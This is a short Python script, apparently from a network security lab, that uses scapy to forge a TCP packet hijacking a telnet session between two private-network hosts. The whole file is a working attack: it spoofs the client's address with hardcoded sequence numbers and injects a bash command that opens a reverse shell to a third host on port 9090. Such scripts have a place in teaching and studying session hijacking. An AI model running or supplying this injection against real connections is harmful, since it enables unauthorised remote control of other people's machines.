#!/usr/bin/python3
import sys
from scapy.all import *

print("Sending Session Hijacking Packet for Reverse Shell.....")
ip = IP(src="10.0.2.6", dst="10.0.2.15")
tcp = TCP(sport=38396, dport=23, flags="A", seq=333990558, ack=2145046576)
data = "\r /bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
